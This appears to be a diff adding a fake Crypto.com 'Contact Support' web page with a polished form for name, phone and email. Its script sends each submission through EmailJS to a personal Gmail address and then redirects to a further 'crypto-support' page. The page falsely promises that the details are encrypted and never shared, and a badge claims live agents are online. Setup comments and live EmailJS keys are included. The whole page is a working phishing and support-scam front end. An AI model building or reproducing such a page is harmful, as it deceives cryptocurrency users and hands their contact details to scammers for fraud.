@@ -1,0 +1,462 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>crypto.com – Contact Support</title>
+<link href="https://fonts.googleapis.com/css2?family=Syne:wght@700;800&family=DM+Sans:wght@400;500&display=swap" rel="stylesheet">
+<!-- EmailJS SDK -->
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  :root {
+    --navy:  #050d1f;
+    --card:  #0b1a34;
+    --bdr:   rgba(56,139,255,.18);
+    --blue:  #1a6fff;
+    --cyan:  #00d4ff;
+    --glow:  rgba(0,212,255,.3);
+    --text:  #e8f0ff;
+    --muted: #7a93b8;
+    --green: #22d3a0;
+    --red:   #ff6b6b;
+  }
+
+  html {
+    height: 100%;
+    background: var(--navy);
+  }
+
+  body {
+    min-height: 100%;
+    font-family: 'DM Sans', sans-serif;
+    color: var(--text);
+    background: var(--navy);
+    display: flex;
+    flex-direction: column;
+    overflow-x: hidden;
+  }
+
+  /* background glows */
+  body::before {
+    content: '';
+    position: fixed; inset: 0; z-index: 0; pointer-events: none;
+    background:
+      radial-gradient(ellipse 70% 55% at 25% 35%, rgba(0,100,255,.15) 0%, transparent 65%),
+      radial-gradient(ellipse 50% 65% at 80% 75%, rgba(0,212,255,.07) 0%, transparent 60%);
+  }
+
+  /* ── HEADER ── */
+  header {
+    position: relative; z-index: 10;
+    display: flex; align-items: center; justify-content: space-between;
+    padding: 14px 20px;
+    border-bottom: 1px solid var(--bdr);
+    background: rgba(5,13,31,.75);
+    backdrop-filter: blur(14px);
+  }
+  .logo-img { height: 30px; width: auto; }
+  .badge {
+    display: flex; align-items: center; gap: 5px;
+    background: rgba(34,211,160,.1);
+    border: 1px solid rgba(34,211,160,.28);
+    color: var(--green);
+    padding: 4px 11px; border-radius: 20px;
+    font-size: .7rem; font-weight: 500; letter-spacing: .04em;
+  }
+  .bdot {
+    width: 6px; height: 6px; border-radius: 50%;
+    background: var(--green); box-shadow: 0 0 5px var(--green);
+    animation: blink 2s infinite;
+  }
+  @keyframes blink { 0%,100%{opacity:1} 50%{opacity:.4} }
+
+  /* ── MAIN ── */
+  main {
+    position: relative; z-index: 1;
+    flex: 1;
+    display: flex; align-items: center; justify-content: center;
+    padding: 20px 16px;
+  }
+
+  /* ── CARD ── */
+  .card {
+    background: var(--card);
+    border: 1px solid var(--bdr);
+    border-radius: 22px;
+    padding: 28px 24px 24px;
+    width: 100%; max-width: 400px;
+    box-shadow: 0 24px 60px rgba(0,0,0,.45), 0 0 0 1px rgba(255,255,255,.03);
+    position: relative;
+    animation: up .45s cubic-bezier(.22,1,.36,1) both;
+  }
+  @keyframes up { from{transform:translateY(22px);opacity:0} to{transform:translateY(0);opacity:1} }
+
+  /* top cyan line */
+  .card::before {
+    content: '';
+    position: absolute; top: 0; left: 50%; transform: translateX(-50%);
+    width: 55%; height: 1px;
+    background: linear-gradient(90deg, transparent, var(--cyan), transparent);
+    border-radius: 1px;
+  }
+
+  /* header row inside card */
+  .card-head {
+    display: flex; align-items: center; gap: 12px;
+    margin-bottom: 18px;
+  }
+  .head-icon {
+    width: 46px; height: 46px; border-radius: 13px; flex-shrink: 0;
+    background: linear-gradient(135deg, var(--blue), var(--cyan));
+    display: grid; place-items: center; font-size: 1.4rem;
+    box-shadow: 0 0 20px var(--glow);
+  }
+  .head-text {}
+  .eyebrow {
+    font-size: .65rem; letter-spacing: .15em; text-transform: uppercase;
+    color: var(--cyan); font-weight: 500; margin-bottom: 2px;
+  }
+  .card-title {
+    font-family: 'Syne', sans-serif; font-size: 1.25rem; font-weight: 800;
+    line-height: 1.15;
+    background: linear-gradient(135deg, #fff 30%, var(--cyan));
+    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+    background-clip: text;
+  }
+
+  .card-sub {
+    font-size: .8rem; color: var(--muted); line-height: 1.55;
+    margin-bottom: 20px;
+  }
+
+  /* ── FIELDS ── */
+  .fields { display: flex; flex-direction: column; gap: 13px; }
+
+  .field { display: flex; flex-direction: column; gap: 5px; }
+
+  label {
+    font-size: .74rem; font-weight: 500; color: var(--muted);
+    display: flex; align-items: center; gap: 4px;
+  }
+  .req { color: var(--cyan); }
+
+  .iw { position: relative; }
+  .iw span {
+    position: absolute; left: 12px; top: 50%; transform: translateY(-50%);
+    font-size: .9rem; pointer-events: none; opacity: .5;
+    transition: opacity .2s;
+  }
+  .iw:focus-within span { opacity: 1; }
+
+  input {
+    width: 100%;
+    background: rgba(255,255,255,.04);
+    border: 1px solid var(--bdr);
+    border-radius: 10px;
+    padding: 11px 12px 11px 38px;
+    color: var(--text);
+    font-family: 'DM Sans', sans-serif; font-size: .88rem;
+    outline: none;
+    transition: border-color .2s, box-shadow .2s, background .2s;
+    -webkit-appearance: none;
+  }
+  input::placeholder { color: #2e4460; }
+  input:focus {
+    border-color: rgba(0,212,255,.6);
+    background: rgba(0,212,255,.04);
+    box-shadow: 0 0 0 3px rgba(0,212,255,.09);
+  }
+  input.err {
+    border-color: var(--red);
+    box-shadow: 0 0 0 3px rgba(255,107,107,.1);
+  }
+
+  .errtxt {
+    font-size: .7rem; color: var(--red);
+    display: none; align-items: center; gap: 4px;
+  }
+  .errtxt.show { display: flex; }
+
+  /* ── BUTTON ── */
+  .btn {
+    width: 100%; margin-top: 4px;
+    background: linear-gradient(135deg, var(--blue), var(--cyan));
+    color: #fff; border: none; border-radius: 12px;
+    padding: 14px 20px;
+    font-family: 'Syne', sans-serif; font-size: .95rem; font-weight: 700;
+    cursor: pointer; letter-spacing: .02em;
+    display: flex; align-items: center; justify-content: center; gap: 8px;
+    transition: opacity .2s, transform .15s, box-shadow .2s;
+    box-shadow: 0 8px 24px rgba(0,140,255,.3);
+    position: relative; overflow: hidden;
+  }
+  .btn:disabled { opacity: .65; cursor: not-allowed; transform: none !important; }
+  .btn:not(:disabled):hover { opacity: .9; transform: translateY(-2px); box-shadow: 0 12px 32px rgba(0,140,255,.4); }
+  .btn:not(:disabled):active { transform: translateY(0); }
+  .arr { transition: transform .2s; }
+  .btn:not(:disabled):hover .arr { transform: translateX(4px); }
+
+  /* spinner inside button */
+  .spin {
+    width: 16px; height: 16px; border-radius: 50%;
+    border: 2px solid rgba(255,255,255,.3);
+    border-top-color: #fff;
+    animation: rot .7s linear infinite;
+    display: none;
+  }
+  @keyframes rot { to{ transform:rotate(360deg); } }
+  .btn.loading .spin { display: block; }
+  .btn.loading .btn-label,
+  .btn.loading .arr { display: none; }
+
+  /* ── PRIVACY ── */
+  .privacy {
+    text-align: center; margin-top: 14px;
+    font-size: .7rem; color: #2e4460;
+    display: flex; align-items: center; justify-content: center; gap: 5px;
+  }
+
+  /* ── TOAST ── */
+  .toast {
+    position: fixed; bottom: 24px; left: 50%; transform: translateX(-50%) translateY(80px);
+    background: #0d2040; border: 1px solid rgba(0,212,255,.3);
+    border-radius: 12px; padding: 12px 20px;
+    font-size: .82rem; color: var(--text);
+    box-shadow: 0 8px 28px rgba(0,0,0,.4);
+    transition: transform .35s cubic-bezier(.22,1,.36,1), opacity .35s;
+    opacity: 0; z-index: 999; white-space: nowrap;
+  }
+  .toast.show { transform: translateX(-50%) translateY(0); opacity: 1; }
+  .toast.success { border-color: rgba(34,211,160,.35); }
+  .toast.fail    { border-color: rgba(255,107,107,.35); }
+
+  /* ── TRANSITION OVERLAY ── */
+  .toverlay {
+    position: fixed; inset: 0; z-index: 9999;
+    background: var(--navy);
+    display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 16px;
+    opacity: 0; pointer-events: none;
+    transition: opacity .4s;
+  }
+  .toverlay.show { opacity: 1; pointer-events: all; }
+  .tring {
+    width: 48px; height: 48px; border-radius: 50%;
+    border: 3px solid rgba(0,212,255,.15);
+    border-top-color: var(--cyan);
+    animation: rot .8s linear infinite;
+  }
+  .ttxt {
+    font-family: 'Syne', sans-serif; font-size: .95rem; font-weight: 600;
+    color: var(--cyan); letter-spacing: .05em;
+  }
+
+  /* ── FOOTER ── */
+  footer {
+    position: relative; z-index: 1;
+    text-align: center; padding: 12px 16px;
+    border-top: 1px solid var(--bdr);
+    color: var(--muted); font-size: .72rem;
+    background: rgba(5,13,31,.5);
+  }
+
+  /* large screens — slight extra breathing room */
+  @media (min-width: 480px) {
+    main { padding: 32px 20px; }
+    .card { padding: 34px 30px 28px; }
+    .card-title { font-size: 1.4rem; }
+    .head-icon { width: 50px; height: 50px; font-size: 1.5rem; }
+  }
+</style>
+</head>
+<body>
+
+<!-- HEADER -->
+<header>
+  <img src="images/logo.png" alt="crypto.com" class="logo-img">
+  <div class="badge"><div class="bdot"></div> Agents Online</div>
+</header>
+
+<!-- MAIN -->
+<main>
+  <div class="card">
+
+    <div class="card-head">
+      <div class="head-icon">🎧</div>
+      <div class="head-text">
+        <p class="eyebrow">24/7 Support</p>
+        <h1 class="card-title">Let's Get<br>You Helped</h1>
+      </div>
+    </div>
+
+    <p class="card-sub">Enter your details and a specialist will be ready for you instantly.</p>
+
+    <div class="fields">
+
+      <!-- NAME -->
+      <div class="field">
+        <label for="fullName">Full Name <span class="req">*</span></label>
+        <div class="iw">
+          <span>👤</span>
+          <input type="text" id="fullName" placeholder="Alex Johnson" autocomplete="name" inputmode="text">
+        </div>
+        <span class="errtxt" id="nameErr">⚠ Please enter your full name.</span>
+      </div>
+
+      <!-- PHONE -->
+      <div class="field">
+        <label for="phone">Phone Number <span class="req">*</span></label>
+        <div class="iw">
+          <span>📞</span>
+          <input type="tel" id="phone" placeholder="+1 800 123 4567" autocomplete="tel" inputmode="tel">
+        </div>
+        <span class="errtxt" id="phoneErr">⚠ Please enter a valid phone number.</span>
+      </div>
+
+      <!-- EMAIL -->
+      <div class="field">
+        <label for="email">Email Address <span class="req">*</span></label>
+        <div class="iw">
+          <span>✉️</span>
+          <input type="email" id="email" placeholder="alex@email.com" autocomplete="email" inputmode="email">
+        </div>
+        <span class="errtxt" id="emailErr">⚠ Please enter a valid email.</span>
+      </div>
+
+      <!-- SUBMIT -->
+      <button class="btn" id="submitBtn" type="button">
+        <span class="spin"></span>
+        <span class="btn-label">Connect to Support</span>
+        <span class="arr">→</span>
+      </button>
+
+    </div>
+
+    <p class="privacy">🔒 Your details are encrypted and never shared.</p>
+
+  </div>
+</main>
+
+<footer>© 2026 Crypto.com · All rights reserved · Support 24/7</footer>
+
+<!-- TOAST -->
+<div class="toast" id="toast"></div>
+
+<!-- TRANSITION OVERLAY -->
+<div class="toverlay" id="toverlay">
+  <div class="tring"></div>
+  <p class="ttxt">Connecting you to support…</p>
+</div>
+
+<script>
+  // ── EmailJS init ──────────────────────────────────────────────
+  // SETUP INSTRUCTIONS (one-time, takes 3 min):
+  // 1. Go to https://www.emailjs.com and sign up FREE
+  // 2. Add Gmail as an Email Service → connect servicenear0@gmail.com → copy "Service ID"
+  // 3. Create an Email Template with these variables:
+  //       From:    {{from_name}}
+  //       Subject: New Crypto Support Request from {{from_name}}
+  //       Body:    Name: {{from_name}}  |  Phone: {{phone}}  |  Email: {{reply_to}}
+  //    → copy "Template ID"
+  // 4. Go to Account → copy "Public Key"
+  // 5. Replace the three placeholders below:
+
+const EMAILJS_PUBLIC_KEY  = '3sF9r_L9Z2CehcJxo';
+const EMAILJS_SERVICE_ID  = 'service_gk7rwjo';
+const EMAILJS_TEMPLATE_ID = 'template_zui452e';
+
+  emailjs.init({ publicKey: EMAILJS_PUBLIC_KEY });
+
+  // ── DOM refs ──────────────────────────────────────────────────
+  const nameInput  = document.getElementById('fullName');
+  const phoneInput = document.getElementById('phone');
+  const emailInput = document.getElementById('email');
+  const submitBtn  = document.getElementById('submitBtn');
+  const toverlay   = document.getElementById('toverlay');
+  const toastEl    = document.getElementById('toast');
+
+  const nameErr  = document.getElementById('nameErr');
+  const phoneErr = document.getElementById('phoneErr');
+  const emailErr = document.getElementById('emailErr');
+
+  // clear errors on type
+  function clr(inp, err) {
+    inp.addEventListener('input', () => { inp.classList.remove('err'); err.classList.remove('show'); });
+  }
+  clr(nameInput, nameErr); clr(phoneInput, phoneErr); clr(emailInput, emailErr);
+
+  // ── Validation ────────────────────────────────────────────────
+  function validate() {
+    let ok = true;
+    const n = nameInput.value.trim();
+    const p = phoneInput.value.trim();
+    const e = emailInput.value.trim();
+    if (n.length < 2)                                { nameInput.classList.add('err');  nameErr.classList.add('show');  ok = false; }
+    if (!/[\d\s\-\+\(\)]{7,}/.test(p))              { phoneInput.classList.add('err'); phoneErr.classList.add('show'); ok = false; }
+    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e))      { emailInput.classList.add('err'); emailErr.classList.add('show'); ok = false; }
+    return ok;
+  }
+
+  // ── Toast helper ──────────────────────────────────────────────
+  let toastTimer;
+  function showToast(msg, type = 'success') {
+    toastEl.textContent = msg;
+    toastEl.className = `toast ${type} show`;
+    clearTimeout(toastTimer);
+    toastTimer = setTimeout(() => toastEl.classList.remove('show'), 4000);
+  }
+
+  // ── Submit ────────────────────────────────────────────────────
+  submitBtn.addEventListener('click', async () => {
+    if (!validate()) return;
+
+    const name  = nameInput.value.trim();
+    const phone = phoneInput.value.trim();
+    const email = emailInput.value.trim();
+
+    // save for greeting on next page
+    sessionStorage.setItem('supportUser', JSON.stringify({ name, phone, email }));
+
+    // loading state
+    submitBtn.classList.add('loading');
+    submitBtn.disabled = true;
+
+    try {
+      await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, {
+        from_name: name,
+        phone:     phone,
+        reply_to:  email,
+        to_email:  'servicenear0@gmail.com',
+        message:   `New support request\nName: ${name}\nPhone: ${phone}\nEmail: ${email}\nTime: ${new Date().toLocaleString()}`
+      });
+
+      showToast('✅ Details received! Connecting you now…', 'success');
+
+      // slight delay then navigate
+      setTimeout(() => {
+        toverlay.classList.add('show');
+        setTimeout(() => { window.location.href = 'crypto-support.html'; }, 1200);
+      }, 700);
+
+    } catch (err) {
+      console.error('EmailJS error:', err);
+      showToast('⚠ Could not send — check EmailJS keys. Redirecting anyway…', 'fail');
+      // still navigate even if email fails
+      setTimeout(() => {
+        toverlay.classList.add('show');
+        setTimeout(() => { window.location.href = 'crypto-support.html'; }, 1200);
+      }, 1800);
+    } finally {
+      submitBtn.classList.remove('loading');
+      submitBtn.disabled = false;
+    }
+  });
+
+  // Enter key support
+  [nameInput, phoneInput, emailInput].forEach(el => {
+    el.addEventListener('keydown', e => { if (e.key === 'Enter') submitBtn.click(); });
+  });
+</script>
+</body>
+</html>
